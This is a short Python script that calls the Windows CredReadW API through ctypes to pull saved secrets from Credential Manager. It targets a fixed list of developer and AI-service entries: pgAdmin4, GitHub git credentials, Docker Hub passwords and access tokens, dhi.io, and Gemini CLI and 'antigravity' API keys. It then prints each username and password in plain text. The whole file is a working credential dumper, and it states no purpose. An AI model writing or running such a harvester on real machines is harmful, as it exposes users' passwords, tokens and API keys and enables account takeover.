import ctypes
from ctypes import wintypes

class CREDENTIAL_ATTRIBUTE(ctypes.Structure):
    _fields_ = [
        ('Keyword', wintypes.LPWSTR),
        ('Flags', wintypes.DWORD),
        ('ValueSize', wintypes.DWORD),
        ('Value', ctypes.POINTER(ctypes.c_byte))
    ]

class CREDENTIAL(ctypes.Structure):
    _fields_ = [
        ('Flags', wintypes.DWORD),
        ('Type', wintypes.DWORD),
        ('TargetName', wintypes.LPWSTR),
        ('Comment', wintypes.LPWSTR),
        ('LastWritten', wintypes.FILETIME),
        ('CredentialBlobSize', wintypes.DWORD),
        ('CredentialBlob', ctypes.POINTER(ctypes.c_byte)),
        ('Persist', wintypes.DWORD),
        ('AttributeCount', wintypes.DWORD),
        ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),
        ('TargetAlias', wintypes.LPWSTR),
        ('UserName', wintypes.LPWSTR)
    ]

CredRead = ctypes.windll.Advapi32.CredReadW
CredRead.argtypes = [wintypes.LPWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.POINTER(CREDENTIAL))]
CredRead.restype = wintypes.BOOL

CredFree = ctypes.windll.Advapi32.CredFree
CredFree.argtypes = [ctypes.c_void_p]

targets = [
    "pgAdmin4",
    "LegacyGeneric:target=pgAdmin4",
    "git:https://github.com",
    "LegacyGeneric:target=git:https://github.com",
    "https://index.docker.io/v1/",
    "LegacyGeneric:target=https://index.docker.io/v1/",
    "https://index.docker.io/v1/access-token",
    "LegacyGeneric:target=https://index.docker.io/v1/access-token",
    "https://dhi.io",
    "LegacyGeneric:target=https://dhi.io",
    "gemini:antigravity",
    "LegacyGeneric:target=gemini:antigravity",
    "gemini-cli-api-key/default-api-key",
    "LegacyGeneric:target=gemini-cli-api-key/default-api-key"
]

for t in targets:
    cred_ptr = ctypes.POINTER(CREDENTIAL)()
    if CredRead(t, 1, 0, ctypes.byref(cred_ptr)):
        c = cred_ptr.contents
        blob = ctypes.string_at(c.CredentialBlob, c.CredentialBlobSize)
        try:
            val = blob.decode('utf-16-le')
        except:
            try:
                val = blob.decode('utf-8')
            except:
                val = str(blob)
        safe_val = val.encode('ascii', 'replace').decode('ascii')
        print(f"Target: {t} | User: {c.UserName} | Password: {safe_val}")
        CredFree(cred_ptr)
    else:
        err = ctypes.GetLastError()
        # print(f"Target: {t} failed with error {err}")
